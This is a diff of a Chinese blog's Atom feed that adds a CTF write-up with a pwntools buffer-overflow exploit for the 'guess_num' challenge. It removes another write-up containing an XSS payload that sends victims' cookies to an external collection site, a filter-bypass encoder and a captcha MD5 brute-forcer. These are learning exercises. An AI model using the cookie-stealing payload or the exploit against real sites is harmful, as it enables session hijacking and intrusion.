@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-05-31T09:32:54.484Z</updated>
+    <updated>2020-06-01T03:09:15.746Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,74 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 小张的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[攻防世界pwn新手区—guess_num]]></title>
+        <id>https://zhangzy999.github.io/post/ad5_guess_num/</id>
+        <link href="https://zhangzy999.github.io/post/ad5_guess_num/">
+        </link>
+        <updated>2020-06-01T02:42:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="srand函数和rand函数">srand()函数和rand()函数</h1>
+<h2 id="引用">引用</h2>
+<p>解这个题首先我们要了解下srand()和rand()</p>
+<blockquote>
+<p>要计算机产生一个随机数不像扔色子一样，计算机的每一步操作，就是执行一堆代码，这些代码是事先安排好的，所以计算机的产生行为是不具有随机性和预测性的（当然这里说的是现阶段的计算机体系，到未来的计算机的体系，未知），所以计算机产生的随机数都不是真正意义上的随机数，只是伪随机数，他以一个真值（也称为种子）作为初始条件，然后用一定的算法不停迭代产生随机数。库函数中系统提供了两个函数用于产生随机数：srand()和rand()<br>
+rand函数：rand的内部是用线性同余法做的，不是真的随机数，只不过因为其周期特别长，所以在一定范围内可以看成是随机的，rand()会返回一随机值，范围在0到RAND_MAX间，在调用此函数产生随机数前，必须利用srand()设好随机数种子，若没有设随机数种子，rand()在调用时会自动设随机数种子为1。<br>
+返回值：返回0到RAND_MAX之间的整数值，RAND_MAX的范围最少在32767之间（int），即双字节（16位）。若unsigned int双字节是65535，且0-RAND_MAX每个数字被选中的随机率是相同的。  rand()产生的是假随机数，每次执行时是相同的，若要不同以不同的值来初始化，初始化的函数就是srand()<br>
+srand函数：and()用来设置rand()产生随机数时的随机数种子，参数seed必须是整数，通常可以用time(0)的返回值作为seed.如果每次seed都设置相同的值，rand()产生的随机数值每次都一样。<br>
+srand(unsigned)time(NULL))使用系统定时/计数器的值作为随机种子每个种子对应一组根据算法预先生成的随机数，所以在相同平台的环境下，不同时间产生的随机数是不同的，相应的若将srand(unsigned)tima(NULL)改为任一常量，则无论何时运行，运行多少次得到的随机数都是一组特定的序列，所以srand生成的随机数是伪随机数。但是，所谓的“伪随机数”指的并不是假的随机数，其实绝对的对技术只是一种假想状态的随机数，计算机只能生成相对的随机数，而这些随机数既是随机的又是有规律的，一部分遵守一定规律，一部分则不遵守任何规律，总结来说就是：计算机产生伪随机数而不是绝对的随机数<br>
+在每次产生随机序列前，先指定不同的种子，这样计算出来的随机序列就不完全相同了，而使用同种子相同的数调用rand()会导致相同的随机数序列被生成</p>
+</blockquote>
+<h2 id="总结">总结</h2>
+<p>总结一下上面的文本：srand()函数为rand()函数指定随机数种子，如果没有srand()函数，那么rand()函数的默认随机数种子就是1，那么为什么称rand()生成的数是伪随机数呢？这是因为，如果每次随机数种子一样，那么每次生成的随机数都是一样的，比如srand(1) ，那么每次的rand()出来的数字都是一样的，所以为了随机性得到提高，我们一般是用时间函数来作为随机数种子，因为时间时刻在变化，所以种子也在变化，那么随机性就会大大提高。</p>
+<h1 id="解题">解题</h1>
+<h2 id="题目分析">题目分析</h2>
+<p>我们拿到附件后，先运行一下看看程序是什么功能<br>
+<img src="https://zhangzy999.github.io//post-images/1590979884236.png" alt="" loading="lazy"><br>
+大致就是让我们输入名字，然后让我们猜随机数<br>
+我们看看程序开启了哪些保护<br>
+<img src="https://zhangzy999.github.io//post-images/1590979923609.png" alt="" loading="lazy"><br>
+看到保护之后瞬间不想做了:-(    金丝雀 nx 地址随机化 神马的都开了 （话说我好像在新手区）<br>
+不管了，IDA分析一下  先看main函数的代码  发现了几个有意思的点<br>
+<img src="https://zhangzy999.github.io//post-images/1590980021878.png" alt="" loading="lazy"><br>
+首先是gets输入名字  输入的字符串存到v9变量里面  那么漏洞应该就在这里没错了<br>
+接下来设置了一个随机数种子，当然，这个随机数种子的随机性肯定是没问题的<br>
+接下来是个for循环，让我们猜10个随机数，如果失败就退出程序，如果成功就运行for循环外面的那个函数<br>
+我们跟进去那个函数看看<br>
+<img src="https://zhangzy999.github.io//post-images/1590980242481.png" alt="" loading="lazy"><br>
+奈斯，直接cat flag，所以我们的任务就是来猜数字，不过是随机数，我们肯定即使是欧皇附体也是猜不到的，所以考虑gets那里溢出来覆盖随机数种子seed[0]，让种子变成一个常数，那么每次的随机数都一样，自然也就可预测了，我们查看一下偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1590980418344.png" alt="" loading="lazy"><br>
+然后就直接写exp</p>
+<h2 id="编写exp">编写exp</h2>
+<p>这个exp比之前的要略微复杂一些，经过查资料发现ctypes这个包很奈斯，里面的cdll.LoadLibrary()函数可以在在脚本中加载动态库，同时又能调用库中的函数，那么我们直接可以通过调用对象的srand()方法来确定种子，那我们就不用再编写c语言程序来确定随机数了，比较方便哈<br>
+通过命令ldd来确定库的路径</p>
+<pre><code>ldd filename
+</code></pre>
+<p>这样就得到了库位置（忘记截图了，懒的再回虚拟机截了）<br>
+然后直接写exp</p>
+<pre><code class="language-python">from pwn import *
+import ctypes
+
+ip = '124.126.19.106'
+port = '49021'
+r = remote(ip,port)
+
+elf = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
+elf.srand(1)
+offset = 0x20
+
+payload = 'A' * offset + p64(1)
+r.recvuntil('Your name:')
+r.sendline(payload)
+for i in range(0,10):
+        number = str(elf.rand()%6 + 1)
+        r.recvuntil('Please input your guess number:')
+        r.sendline(number)
+r.interactive()
+</code></pre>
+<p>然后就是flag辣<br>
+<img src="https://zhangzy999.github.io//post-images/1590980821050.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[攻防世界pwn新手区—level2]]></title>
         <id>https://zhangzy999.github.io/post/ad_world_level2/</id>
@@ -450,121 +518,6 @@ while True:
 友链：<a href="http://z.mofalongmao.xyz/wordpress/">http://z.mofalongmao.xyz/wordpress/</a><br>
 R1v0ir<br>
 友链：<a href="https://r1v0ir.github.io/">https://r1v0ir.github.io/</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CTF之一道硬核的XSS梦幻联动SQL注入的赛题—[CISCN2019 华东北赛区]Web2]]></title>
-        <id>https://zhangzy999.github.io/post/web2-xss/</id>
-        <link href="https://zhangzy999.github.io/post/web2-xss/">
-        </link>
-        <updated>2020-04-28T12:45:18.000Z</updated>
-        <content type="html"><![CDATA[<p>文章撰写参考链接，原大佬博客<a href="%22https://www.zhaoj.in/read-6100.html%22"></a><br>
-本文是笔者在学习大佬博客基础上写成的(我太菜了)<br>
-这道题呢对小白一点儿也不友好<br>
-反正我是打了五个小时，最后发现payload没有加引号（骂骂咧咧）<br>
-言归正传，我们打开环境，发现是一个网站，有投稿和反馈功能<br>
-<img src="https://zhangzy999.github.io//post-images/1588078652213.png" alt="" loading="lazy"><br>
-就是说我们可以投稿，然后点击审核，管理员就会来到我们的页面，审核我们的投稿<br>
-这样的话我们可以构造恶意代码，让管理员进去，从而窃取管理员的cookie，进入后台为所欲为（滑稽）<br>
-好，我们看一下它的投稿页面和审核页面<br>
-<img src="https://zhangzy999.github.io//post-images/1588078732024.png" alt="" loading="lazy"><br>
-<img src="https://zhangzy999.github.io//post-images/1588078738665.png" alt="" loading="lazy"><br>
-嗯，xss没跑了<br>
-我们上平台，平台链接是<br>
-<a href="http://xss.buuoj.cn/">buu的xss平台</a><br>
-你需要注册一个账号，然后新建项目，这块不说了，就跟安装软件一直点下一步一样简单。。。<br>
-<img src="https://zhangzy999.github.io//post-images/1588079093914.png" alt="" loading="lazy"><br>
-OK，平台会自动帮我们生成xss代码，自己可以研究一下那一摞代码都是干嘛的，很有意思哟<br>
-OK，我们回到投稿页面，来一个最简单的脚本实验一下</p>
-<pre><code class="language-Javascript">&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
-<p>提示我们上传成功<br>
-<img src="https://zhangzy999.github.io//post-images/1588079347722.png" alt="" loading="lazy"><br>
-我们点击那个页面，但是并没有弹窗，我们查看页面源代码，好像发现了不得了的事情<br>
-<img src="https://zhangzy999.github.io//post-images/1588079455672.png" alt="" loading="lazy"><br>
-没错，我们输入的英文小括号被换成中文的了，说明后端有保护机制，不过虽然头大，我们却可以用markup编码的方式绕过（就是我们喜闻乐见的&amp;#编码）<br>
-<img src="https://zhangzy999.github.io//post-images/1588080034916.png" alt="" loading="lazy"><br>
-这个编码就是&amp;#后面加上我们的ascii码<br>
-链接如下：<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html"></a><br>
-再看之前的源代码<br>
-<img src="https://zhangzy999.github.io//post-images/1588080193440.png" alt="" loading="lazy"><br>
-它有个CSP内容安全策略的存在，<a href="https://blog.csdn.net/u014465934/article/details/84199171">CSP内容安全策略详解，在此不再赘述</a><br>
-对，它开启了'unsafe-eval'，所以我们可以用eval来执行我们的代码<br>
-好，我们的payload为</p>
-<pre><code class="language-javascript">&lt;svg&gt;&lt;script&gt;eval(&quot;xss&quot;)&lt;/script&gt;
-</code></pre>
-<p>而xss就是我们要填充的恶意代码，如下</p>
-<pre><code class="language-javascript">(function(){window.location.href=
-'http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
-+
-escape((function(){try{return document.location.href}catch(e){return''}})())
-+
-'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
-+
-'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
-+
-'&amp;opener='
-+
-escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)
-?window.opener.location.href:''}catch(e){return''}})());})();
-</code></pre>
-<p>注意哈，我是为了大家阅读代码才用换行符分开的，大家中间不要掺杂换行符否则xss不会成功的<br>
-<img src="https://zhangzy999.github.io//post-images/1588080785595.png" alt="" loading="lazy"><br>
-还有一点，就是上图的id那里要设置成你的项目的id，在项目代码里有<br>
-然后接下来我们要做的就是把上述内容给它来个Markup编码，但是手工emm几乎不可能实现除非你是肝帝<br>
-接下来上python脚本好了（版本python2.7）</p>
-<pre><code class="language-python">payload_end = ''
-payload = &quot;(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
-+escape((function(){try{return document.location.href}catch(e){return''}})())+
-'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
-+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
-+'&amp;opener='+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''}
-catch(e){return''}})());})();&quot;
-for i in payload:
-    payload_end += &quot;&amp;#&quot; + str(ord(i))
-payload_final = &quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + payload_end + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;
-print payload_final
-</code></pre>
-<p>同样是便于阅读，再此强调一下哈，中间千万别要换行符，因为换行符会占一个ascii码的......<br>
-脚本运行效果如下：<br>
-<img src="https://zhangzy999.github.io//post-images/1588081474858.png" alt="" loading="lazy"><br>
-再次提醒：前文中我省事儿用的是别的大佬的payload，这个做法可以，但是不要忘记改id哦~<br>
-当然......你在你的项目里复制代码最好不过了<br>
-然后我们提交这段恶意代码，显示提交成功，这个时候我们的任务已经完成一半了，接下来要做的是反馈页面，然后让管理员访问我们的提交页面从而偷取它的cookie     <s>馋了，想吃曲奇饼干了</s><br>
-好，我们进入反馈页面<br>
-<img src="https://zhangzy999.github.io//post-images/1588081872289.png" alt="" loading="lazy"><br>
-它还需要验证码，给大家附上一个链接，讲的是hash碰撞与生日攻击，蛮有意思的，虽然我没看完（逃）<br>
-<a href="https://blog.csdn.net/zl1zl2zl3/article/details/83476069">哈希碰撞与生日攻击学习参考链接</a><br>
-好，由于是前六位，我们需要的工作量并不是特别大，最起码我们知道了循环的范围是从6位数开始，额，先到1k我循环试试吧，不过经过我的多次实验发现1kw足够了，下面是碰撞md5的python脚本（python大法好）</p>
-<pre><code class="language-python">import hashlib
-for x in range(100000,10000000):
-    md5_hack = hashlib.md5(str(x)).hexdigest()
-    if md5_hack[0:6] == &quot;1d5327&quot; :
-        print x
-</code></pre>
-<p>上述代码中的&quot;1d5327&quot;就是我们反馈的时候提示我们的验证码，我们通过碰撞的方式来得到原来的验证码<br>
-经过十几秒最终跑出来了<br>
-<img src="https://zhangzy999.github.io//post-images/1588082715077.png" alt="" loading="lazy"><br>
-我们输入碰撞得来的密码，提示我们反馈成功<br>
-<img src="https://zhangzy999.github.io//post-images/1588082798662.png" alt="" loading="lazy"><br>
-OK，我们去平台那里坐等管理员的cookie<br>
-<img src="https://zhangzy999.github.io//post-images/1588082880953.png" alt="" loading="lazy"><br>
-OK，拿到cookie了，然后开始扫描康康管理员的后台登录界面<br>
-很简单，就是admin.php<br>
-我们进去之后<br>
-发现如下图：<br>
-<img src="https://zhangzy999.github.io//post-images/1588082964511.png" alt="" loading="lazy"><br>
-提示我们不是管理员，没毛病吧，然后我们通过小插件来输入管理员的cookie，伪造管理员的身份进去就好啦<br>
-<img src="https://zhangzy999.github.io//post-images/1588083070484.png" alt="" loading="lazy"><br>
-好，我们已经成功进入后台，出现了一个查询框框<br>
-<img src="https://zhangzy999.github.io//post-images/1588083098026.png" alt="" loading="lazy"><br>
-嗯......sql注入没跑了<br>
-这个sql注入是最低级的sql注入了，没有防火墙，sqlmap一把梭即可，或者手工注入也很简单鸭<br>
-我直接附上注入的最后结果<br>
-<img src="https://zhangzy999.github.io//post-images/1588083277788.png" alt="" loading="lazy"><br>
-如果大家对sql注入的赛题感兴趣，请在哔哩哔哩上搜索up主：yuyu-宇<br>
-这个是我的主页，我做了很多包括教学视频和刷题视频，都是sql注入方面的<br>
-如果文章内容哪里不对，还请哔哩哔哩私信联系我，蟹蟹大家！！</p>
 ]]></content>
     </entry>
 </feed>
